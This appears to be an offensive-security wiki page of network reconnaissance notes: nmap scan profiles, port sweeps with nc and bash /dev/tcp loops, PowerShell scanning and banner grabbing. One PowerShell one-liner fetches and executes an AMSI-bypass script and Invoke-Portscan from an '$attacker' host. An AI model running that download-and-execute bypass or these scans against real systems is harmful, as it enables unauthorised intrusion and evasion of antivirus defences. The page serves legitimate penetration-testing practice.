---
title: "Networking"
date: 2025-10-03
draft: false
type: wiki
---

# nmap

I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:
```console
nmap -sV -O --top-ports 50 --open -oA nmap/initial <ip or cidr>
nmap -sC -sV -O --open -p- -oA nmap/full <ip or cidr>
nmap -sU -p- -oA nmap/udp <ip or cidr>

--top-ports only scan the N most common ports
--open only show open ports
-sC use the default scripts
-sV detect versions
-O detect Operating Systems
-p- scan all the ports
-oA save the output in normal format, grepable and xml
-sU scan UDP ports
```
Is also possible to specify scripts or ports:

```console
nmap --scripts vuln,safe,discovery -p 443,80 <ip or cidr>
```

If there are servers that could be not answering (ping), then add the flag -Pn (example of initial one):

```console
nmap -Pn --top-ports 50 --open -oA nmap/initial <ip or cidr>
```

-----------------------------

# Ports discovery (without nmap)

## nc + bash

If you get in a machine that doesn't have nmap installed, you can do a basic discovery of (for example), top 10 ports open in 192.168.30 by doing:

```bash
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do nc -w 1 192.168.30.253 $i && echo "Port $i is open" || echo "Port $i is closed or filtered"; done
```

## /dev/tcp/ip/port or /dev/udp/ip/port

Alternatively, is possible to do the same than above but by using the special dev files `/dev/tcp/ip/port` or `/dev/udp/ip/port` (for example nc is not found):

```bash
top10=(20 21 22 23 25 80 110 139 443 445 3389); for i in "${top10[@]}"; do (echo > /dev/tcp/192.168.30.253/"$i") > /dev/null 2>&1 && echo "Port $i is open" || echo "Port $i is closed"; done
```

Taking these last  examples, is straightforward to create a dummy script for scan a hole /24 net (for example):

```bash
#!/bin/bash
subnet="192.168.30"
top10=(20 21 22 23 25 80 110 139 443 445 3389)
for host in {1..255}; do
    for port in "${top10[@]}"; do
        (echo > /dev/tcp/"${subnet}.${host}/${port}") > /dev/null 2>&1 && echo "Host ${subnet}.${host} has ${port} open" || echo "Host ${subnet}.${host} has ${port} closed"
    done
done
```

-----------------------------

# Powershell

## By using Invoke-PortScan (PowerSploit)

```powershell
$topports="50";$target="192.168.42.43,192.168.42.44,172.16.44.42,172.16.1.1,172.16.255.253";$attacker="192.168.42.42";IEX(New-Object Net.Webclient).downloadString("http://$attacker/4msibyp455.ps1");IEX(New-Object Net.Webclient).downloadString("http://$attacker/Invoke-Portscan.ps1");Invoke-Portscan -Hosts "$target" -TopPorts "$topports"
```

## Leverage Native Powershell

```powershell
$target = '192.168.42.42';$scanPorts = @('80', '8080', '443', '8081', '3128', '25', '5985', '5986', '445', '139'); foreach($port in $scanPorts){Test-NetConnection -ComputerName $target -InformationLevel "Quiet" -Port $port}
```

-----------------------------

# Banner grabbing (without nmap)

If nmap didn't grab banners (or is not installed), you can do it with `/dev/tcp/ip/port` `/dev/udp/ip/port` or by using telnet.

## /dev/tcp/ip/port or /dev/udp/ip/port

```console
cat < /dev/tcp/192.168.30.253/22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
```
For doing it with udp ports is the same, but changing tcp for udp

## telnet

```console
telnet 192.168.30.253 22
SSH-2.0-OpenSSH_6.2p2 Debian-6
^C pressed here
```

-----------------------------
